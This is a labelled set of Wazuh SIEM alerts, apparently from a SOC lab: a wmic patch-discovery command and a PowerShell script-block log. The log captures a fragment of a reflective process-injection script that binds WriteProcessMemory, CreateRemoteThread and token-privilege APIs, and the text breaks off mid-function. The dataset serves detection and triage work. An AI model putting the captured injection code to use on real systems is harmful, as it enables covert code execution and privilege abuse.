{"id": "CgoH4JcBiGYaRV9X3LQU", "description": "Suspicious Windows cmd shell execution", "label": "TP", "rule_level": 3, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.06", "_id": "CgoH4JcBiGYaRV9X3LQU", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"originalFileName": "wmic.exe", "image": "C:\\\\Windows\\\\System32\\\\wbem\\\\WMIC.exe", "product": "Microsoft\u00ae Windows\u00ae Operating System", "parentProcessGuid": "{ff3427f9-80d8-686a-4006-000000001600}", "description": "WMI Commandline Utility", "logonGuid": "{ff3427f9-5f92-686a-d1e8-3b0200000000}", "parentCommandLine": "\\\"cmd.exe\\\" /c wmic qfe get description,installedOn /format:csv", "processGuid": "{ff3427f9-80d8-686a-4206-000000001600}", "logonId": "0x23be8d1", "parentProcessId": "5788", "processId": "788", "currentDirectory": "C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\", "utcTime": "2025-07-06 13:57:44.383", "hashes": "SHA1=D5AE0D13127AE8A7F872F5F3A835D6E217C44A86,MD5=76739CA32A2D852E9953BFC5AD0FDC08,SHA256=9C439179991319D1C6BE5ECD50C01738F9DE6B5EE9E8702FEE612E725C086F9F,IMPHASH=43C6BE584D77B658A53A9A5C606724DD", "parentImage": "C:\\\\Windows\\\\System32\\\\cmd.exe", "ruleName": "technique_id=T1059,technique_name=Command-Line Interface", "company": "Microsoft Corporation", "commandLine": "wmic  qfe get description,installedOn /format:csv", "integrityLevel": "High", "fileVersion": "10.0.26100.3323 (WinBuild.160101.0800)", "user": "SOCLAB\\\\snell", "terminalSessionId": "2", "parentUser": "SOCLAB\\\\snell"}, "system": {"eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\r\nUtcTime: 2025-07-06 13:57:44.383\r\nProcessGuid: {ff3427f9-80d8-686a-4206-000000001600}\r\nProcessId: 788\r\nImage: C:\\Windows\\System32\\wbem\\WMIC.exe\r\nFileVersion: 10.0.26100.3323 (WinBuild.160101.0800)\r\nDescription: WMI Commandline Utility\r\nProduct: Microsoft\u00ae Windows\u00ae Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: wmic.exe\r\nCommandLine: wmic  qfe get description,installedOn /format:csv\r\nCurrentDirectory: C:\\Users\\snell\\AppData\\Local\\Temp\\\r\nUser: SOCLAB\\snell\r\nLogonGuid: {ff3427f9-5f92-686a-d1e8-3b0200000000}\r\nLogonId: 0x23BE8D1\r\nTerminalSessionId: 2\r\nIntegrityLevel: High\r\nHashes: SHA1=D5AE0D13127AE8A7F872F5F3A835D6E217C44A86,MD5=76739CA32A2D852E9953BFC5AD0FDC08,SHA256=9C439179991319D1C6BE5ECD50C01738F9DE6B5EE9E8702FEE612E725C086F9F,IMPHASH=43C6BE584D77B658A53A9A5C606724DD\r\nParentProcessGuid: {ff3427f9-80d8-686a-4006-000000001600}\r\nParentProcessId: 5788\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: \"cmd.exe\" /c wmic qfe get description,installedOn /format:csv\r\nParentUser: SOCLAB\\snell\"", "version": "5", "systemTime": "2025-07-06T13:57:44.3854955Z", "eventRecordID": "876031", "threadID": "3716", "computer": "Win11Client.soclab.internal", "task": "1", "processID": "3024", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 9, "mail": false, "description": "Suspicious Windows cmd shell execution", "groups": ["sysmon", "sysmon_eid1_detections", "windows"], "mitre": {"technique": ["Account Discovery", "Windows Command Shell"], "id": ["T1087", "T1059.003"], "tactic": ["Discovery", "Execution"]}, "id": "92032"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751810297.28393054", "timestamp": "2025-07-06T13:58:17.442+0000"}, "fields": {"timestamp": ["2025-07-06T13:58:17.442Z"]}, "sort": [1751810297442]}}
{"id": "cgoM4JcBiGYaRV9XRrXE", "description": "Powershell script may be executing suspicious code with CreateThread API", "label": "TP", "rule_level": 10, "rule_priority": "Medium", "alert": {"_index": "wazuh-alerts-4.x-2025.07.06", "_id": "cgoM4JcBiGYaRV9XRrXE", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"messageNumber": "4", "messageTotal": "11", "scriptBlockText": "teType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])         $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)   $Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory      $ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory         $ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])         $ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)   $Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $ReadProcessMemory      $CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread         $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])         $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)   $Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread      $GetExitCodeThreadAddr = Get-ProcAddress kernel32.dll GetExitCodeThread         $GetExitCodeThreadDelegate = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])         $GetExitCodeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetExitCodeThreadAddr, $GetExitCodeThreadDelegate)   $Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $GetExitCodeThread      $OpenThreadTokenAddr = Get-ProcAddress Advapi32.dll OpenThreadToken         $OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])         $OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)   $Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $OpenThreadToken      $GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread         $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])         $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)   $Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $GetCurrentThread      $AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges         $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])         $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)   $Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $AdjustTokenPrivileges      $LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA         $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], [IntPtr]) ([Bool])         $LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)   $Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $LookupPrivilegeValue      $ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf         $ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])         $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)   $Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $ImpersonateSelf            # NtCreateThreadEx is only ever called on Vista and Win7. NtCreateThreadEx is not exported by ntdll.dll in Windows XP         if (([Environment]::OSVersion.Version -ge (New-Object 'Version' 6,0)) -and ([Environment]::OSVersion.Version -lt (New-Object 'Version' 6,2))) {       $NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx             $NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])             $NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateThreadExAddr, $NtCreateThreadExDelegate)       $Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $NtCreateThreadEx         }      $IsWow64ProcessAddr = Get-ProcAddress Kernel32.dll IsWow64Process         $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])         $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)   $Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $IsWow64Process      $CreateThreadAddr = Get-ProcAddress Kernel32.dll CreateThread         $CreateThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])         $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)   $Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value $CreateThread     $LocalFreeAddr = Get-ProcAddress kernel32.dll VirtualFree   $LocalFreeDelegate = Get-DelegateType @([IntPtr])   $LocalFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LocalFreeAddr, $LocalFreeDelegate)   $Win32Functions | Add-Member NoteProperty -Name LocalFree -Value $LocalFree    return $Win32Functions  }  #####################################       #####################################  ###########    HELPERS   ############  #####################################   #Powershell only does signed arithmetic, so if we want to calculate memory addresses we have to use this function  #This will add signed integers as if they were unsigned integers so we can accurately calculate memory addresses  Function Sub-SignedIntAsUnsigned  {   Param(   [Parameter(Position = 0, Mandatory = $true)]   [Int64]   $Value1,      [Parameter(Position = 1, Mandatory = $true)]   [Int64]   $Value2   )      [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)   [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)   [Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)    if ($Value1Bytes.Count -eq $Value2Bytes.Count)   {    $CarryOver = 0    for ($i = 0; $i -lt $Value1Bytes.Count; $i++)    {     $Val = $Value1Bytes[$i] - $CarryOver     #Sub bytes     if ($Val -lt $Value2Bytes[$i])     {      $Val += 256      $CarryOver = 1     }     else     {      $CarryOver = 0     }               [UInt16]$Sum = $Val - $Value2Bytes[$i]      $FinalBytes[$i] = $Sum -band 0x00FF    }   }   else   {    Throw \\\"Cannot subtract bytearrays of different sizes\\\"   }      return [BitConverter]::ToInt64($FinalBytes, 0)  }     Function Add-SignedIntAsUnsigned  {   Param(   [Parameter(Position = 0, Mandatory = $true)]   [Int64]   $Value1,      [Parameter(Position = 1, Mandatory = $true)]   [Int64]   $Value2   )      [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)   [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)   [Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)    if ($Value1Bytes.Count -eq $Value2Bytes.Count)   {    $CarryOver = 0    for ($i = 0; $i -lt $Value1Bytes.Count; $i++)    {     #Add bytes     [UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver      $FinalBytes[$i] = $Sum -band 0x00FF          if (($Sum -band 0xFF00) -eq 0x100)     {      $CarryOver = 1     }     else     {      $CarryOver = 0     }    }   }   else   {    Throw \\\"Cannot add bytearrays of different sizes\\\"   }      return [BitConverter]::ToInt64($FinalBytes, 0)  }     Function Compare-Val1GreaterThanVal2AsUInt  {   Param(   [Parameter(Position = 0, Mandatory = $true)]   [Int64]   $Value1,      [Parameter(Position = 1, Mandatory = $true)]   [Int64]   $Value2   )      [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)   [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)    if ($Value1Bytes.Count -eq $Value2Bytes.Count)   {    for ($i = $Value1Bytes.Count-1; $i -ge 0; $i--)    {     if ($Value1Bytes[$i] -gt $Value2Bytes[$i])     {      return $true     }     elseif ($Value1Bytes[$i] -lt $Value2Bytes[$i])     {      return $false     }    }   }   else   {    Throw \\\"Cannot compare byte arrays of different size\\\"   }      return $false  }     Function Convert-UIntToInt  {   Param(   [Parameter(Position = 0, Mandatory = $true)]   [UInt64]   $Value   )      [Byte[]]$ValueBytes = [BitConverter]::GetBytes($Value)   return ([BitConverter]::ToInt64($ValueBytes, 0))  }      Function Test-MemoryRangeValid  {   Param(   [Parameter(Position = 0, Mandatory = $true)]   [String]   $DebugString,      [Parameter(Position = 1, Mandatory = $true)]   [System.Object]   $PEInfo,      [Parameter(Position = 2, Mandatory = $true)]   [IntPtr]   $StartAddress,      [Parameter(ParameterSetName = \\\"Size\\\", Position = 3, Mandatory = $true)]   [IntPtr]   $Size   )         [IntPtr]$FinalEndAddress = [IntPtr](Add-SignedIntAsUnsigned ($StartAddress) ($Size))      $PEEndAddress = $PEInfo.EndAddress      if ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.PEHandle) ($StartAddress)) -eq $true)   {    Throw \\\"Trying to write to memory smaller than allocated address range. $DebugString\\\"   }   if ((Compare-Val1GreaterThanVal2AsUInt ($FinalEndAddress) ($PEEndAddress)) -eq $true)   {    Throw \\\"Trying to write to memory greater than allocated address range. $DebugString\\\"   }  }      Function Write-BytesToMemory  {   Param(    [Parameter(Position=0, Mandatory = $true)]    [Byte[]]    $Bytes,        [Parameter(Position=1, Mandatory = $true)]    [IntPtr]    $MemoryAddress   )     for ($Offset = 0; $Offset -lt $Bytes.Length; $Offset++)   {    [System.Runtime.InteropServices.Marshal]::WriteByte($MemoryAddress, $Offset, $Bytes[$Offset])   }  }     #Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/  Function Get-DelegateType  {      Param      (          [OutputType([Type])]                    [Parameter( Position = 0)]          [Type[]]          $Parameters = (New-Object Type[](0)),                    [Parameter( Position = 1 )]          [Type]          $ReturnType = [Void]      )       $Domain = [AppDomain]::CurrentDomain      $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')      $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)      $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)      $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])      $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpec", "scriptBlockId": "b5207ccb-4732-4af2-8224-9d1dde7e3243"}, "system": {"eventID": "4104", "keywords": "0x0", "providerGuid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "level": "3", "channel": "Microsoft-Windows-PowerShell/Operational", "opcode": "15", "message": "\"Creating Scriptblock text (4 of 11):\r\nteType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])\n        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)\n\t\t$Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory\n\t\t\n\t\t$ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory\n        $ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])\n        $ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)\n\t\t$Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $ReadProcessMemory\n\t\t\n\t\t$CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread\n        $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])\n        $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)\n\t\t$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread\n\t\t\n\t\t$GetExitCodeThreadAddr = Get-ProcAddress kernel32.dll GetExitCodeThread\n        $GetExitCodeThreadDelegate = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])\n        $GetExitCodeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetExitCodeThreadAddr, $GetExitCodeThreadDelegate)\n\t\t$Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $GetExitCodeThread\n\t\t\n\t\t$OpenThreadTokenAddr = Get-ProcAddress Advapi32.dll OpenThreadToken\n        $OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])\n        $OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)\n\t\t$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $OpenThreadToken\n\t\t\n\t\t$GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread\n        $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])\n        $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)\n\t\t$Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $GetCurrentThread\n\t\t\n\t\t$AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges\n        $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])\n        $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)\n\t\t$Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $AdjustTokenPrivileges\n\t\t\n\t\t$LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA\n        $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], [IntPtr]) ([Bool])\n        $LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)\n\t\t$Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $LookupPrivilegeValue\n\t\t\n\t\t$ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf\n        $ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])\n        $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)\n\t\t$Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $ImpersonateSelf\n\t\t\n        # NtCreateThreadEx is only ever called on Vista and Win7. NtCreateThreadEx is not exported by ntdll.dll in Windows XP\n        if (([Environment]::OSVersion.Version -ge (New-Object 'Version' 6,0)) -and ([Environment]::OSVersion.Version -lt (New-Object 'Version' 6,2))) {\n\t\t    $NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx\n            $NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])\n            $NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateThreadExAddr, $NtCreateThreadExDelegate)\n\t\t    $Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $NtCreateThreadEx\n        }\n\t\t\n\t\t$IsWow64ProcessAddr = Get-ProcAddress Kernel32.dll IsWow64Process\n        $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])\n        $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)\n\t\t$Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $IsWow64Process\n\t\t\n\t\t$CreateThreadAddr = Get-ProcAddress Kernel32.dll CreateThread\n        $CreateThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])\n        $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)\n\t\t$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value $CreateThread\n\t\n\t\t$LocalFreeAddr = Get-ProcAddress kernel32.dll VirtualFree\n\t\t$LocalFreeDelegate = Get-DelegateType @([IntPtr])\n\t\t$LocalFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LocalFreeAddr, $LocalFreeDelegate)\n\t\t$Win32Functions | Add-Member NoteProperty -Name LocalFree -Value $LocalFree\n\n\t\treturn $Win32Functions\n\t}\n\t#####################################\n\n\t\t\t\n\t#####################################\n\t###########    HELPERS   ############\n\t#####################################\n\n\t#Powershell only does signed arithmetic, so if we want to calculate memory addresses we have to use this function\n\t#This will add signed integers as if they were unsigned integers so we can accurately calculate memory addresses\n\tFunction Sub-SignedIntAsUnsigned\n\t{\n\t\tParam(\n\t\t[Parameter(Position = 0, Mandatory = $true)]\n\t\t[Int64]\n\t\t$Value1,\n\t\t\n\t\t[Parameter(Position = 1, Mandatory = $true)]\n\t\t[Int64]\n\t\t$Value2\n\t\t)\n\t\t\n\t\t[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)\n\t\t[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)\n\t\t[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)\n\n\t\tif ($Value1Bytes.Count -eq $Value2Bytes.Count)\n\t\t{\n\t\t\t$CarryOver = 0\n\t\t\tfor ($i = 0; $i -lt $Value1Bytes.Count; $i++)\n\t\t\t{\n\t\t\t\t$Val = $Value1Bytes[$i] - $CarryOver\n\t\t\t\t#Sub bytes\n\t\t\t\tif ($Val -lt $Value2Bytes[$i])\n\t\t\t\t{\n\t\t\t\t\t$Val += 256\n\t\t\t\t\t$CarryOver = 1\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t{\n\t\t\t\t\t$CarryOver = 0\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\t\n\t\t\t\t[UInt16]$Sum = $Val - $Value2Bytes[$i]\n\n\t\t\t\t$FinalBytes[$i] = $Sum -band 0x00FF\n\t\t\t}\n\t\t}\n\t\telse\n\t\t{\n\t\t\tThrow \"Cannot subtract bytearrays of different sizes\"\n\t\t}\n\t\t\n\t\treturn [BitConverter]::ToInt64($FinalBytes, 0)\n\t}\n\t\n\n\tFunction Add-SignedIntAsUnsigned\n\t{\n\t\tParam(\n\t\t[Parameter(Position = 0, Mandatory = $true)]\n\t\t[Int64]\n\t\t$Value1,\n\t\t\n\t\t[Parameter(Position = 1, Mandatory = $true)]\n\t\t[Int64]\n\t\t$Value2\n\t\t)\n\t\t\n\t\t[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)\n\t\t[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)\n\t\t[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)\n\n\t\tif ($Value1Bytes.Count -eq $Value2Bytes.Count)\n\t\t{\n\t\t\t$CarryOver = 0\n\t\t\tfor ($i = 0; $i -lt $Value1Bytes.Count; $i++)\n\t\t\t{\n\t\t\t\t#Add bytes\n\t\t\t\t[UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver\n\n\t\t\t\t$FinalBytes[$i] = $Sum -band 0x00FF\n\t\t\t\t\n\t\t\t\tif (($Sum -band 0xFF00) -eq 0x100)\n\t\t\t\t{\n\t\t\t\t\t$CarryOver = 1\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t{\n\t\t\t\t\t$CarryOver = 0\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\telse\n\t\t{\n\t\t\tThrow \"Cannot add bytearrays of different sizes\"\n\t\t}\n\t\t\n\t\treturn [BitConverter]::ToInt64($FinalBytes, 0)\n\t}\n\t\n\n\tFunction Compare-Val1GreaterThanVal2AsUInt\n\t{\n\t\tParam(\n\t\t[Parameter(Position = 0, Mandatory = $true)]\n\t\t[Int64]\n\t\t$Value1,\n\t\t\n\t\t[Parameter(Position = 1, Mandatory = $true)]\n\t\t[Int64]\n\t\t$Value2\n\t\t)\n\t\t\n\t\t[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)\n\t\t[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)\n\n\t\tif ($Value1Bytes.Count -eq $Value2Bytes.Count)\n\t\t{\n\t\t\tfor ($i = $Value1Bytes.Count-1; $i -ge 0; $i--)\n\t\t\t{\n\t\t\t\tif ($Value1Bytes[$i] -gt $Value2Bytes[$i])\n\t\t\t\t{\n\t\t\t\t\treturn $true\n\t\t\t\t}\n\t\t\t\telseif ($Value1Bytes[$i] -lt $Value2Bytes[$i])\n\t\t\t\t{\n\t\t\t\t\treturn $false\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\telse\n\t\t{\n\t\t\tThrow \"Cannot compare byte arrays of different size\"\n\t\t}\n\t\t\n\t\treturn $false\n\t}\n\t\n\n\tFunction Convert-UIntToInt\n\t{\n\t\tParam(\n\t\t[Parameter(Position = 0, Mandatory = $true)]\n\t\t[UInt64]\n\t\t$Value\n\t\t)\n\t\t\n\t\t[Byte[]]$ValueBytes = [BitConverter]::GetBytes($Value)\n\t\treturn ([BitConverter]::ToInt64($ValueBytes, 0))\n\t}\n\t\n\t\n\tFunction Test-MemoryRangeValid\n\t{\n\t\tParam(\n\t\t[Parameter(Position = 0, Mandatory = $true)]\n\t\t[String]\n\t\t$DebugString,\n\t\t\n\t\t[Parameter(Position = 1, Mandatory = $true)]\n\t\t[System.Object]\n\t\t$PEInfo,\n\t\t\n\t\t[Parameter(Position = 2, Mandatory = $true)]\n\t\t[IntPtr]\n\t\t$StartAddress,\n\t\t\n\t\t[Parameter(ParameterSetName = \"Size\", Position = 3, Mandatory = $true)]\n\t\t[IntPtr]\n\t\t$Size\n\t\t)\n\t\t\n\t    [IntPtr]$FinalEndAddress = [IntPtr](Add-SignedIntAsUnsigned ($StartAddress) ($Size))\n\t\t\n\t\t$PEEndAddress = $PEInfo.EndAddress\n\t\t\n\t\tif ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.PEHandle) ($StartAddress)) -eq $true)\n\t\t{\n\t\t\tThrow \"Trying to write to memory smaller than allocated address range. $DebugString\"\n\t\t}\n\t\tif ((Compare-Val1GreaterThanVal2AsUInt ($FinalEndAddress) ($PEEndAddress)) -eq $true)\n\t\t{\n\t\t\tThrow \"Trying to write to memory greater than allocated address range. $DebugString\"\n\t\t}\n\t}\n\t\n\t\n\tFunction Write-BytesToMemory\n\t{\n\t\tParam(\n\t\t\t[Parameter(Position=0, Mandatory = $true)]\n\t\t\t[Byte[]]\n\t\t\t$Bytes,\n\t\t\t\n\t\t\t[Parameter(Position=1, Mandatory = $true)]\n\t\t\t[IntPtr]\n\t\t\t$MemoryAddress\n\t\t)\n\t\n\t\tfor ($Offset = 0; $Offset -lt $Bytes.Length; $Offset++)\n\t\t{\n\t\t\t[System.Runtime.InteropServices.Marshal]::WriteByte($MemoryAddress, $Offset, $Bytes[$Offset])\n\t\t}\n\t}\n\t\n\n\t#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/\n\tFunction Get-DelegateType\n\t{\n\t    Param\n\t    (\n\t        [OutputType([Type])]\n\t        \n\t        [Parameter( Position = 0)]\n\t        [Type[]]\n\t        $Parameters = (New-Object Type[](0)),\n\t        \n\t        [Parameter( Position = 1 )]\n\t        [Type]\n\t        $ReturnType = [Void]\n\t    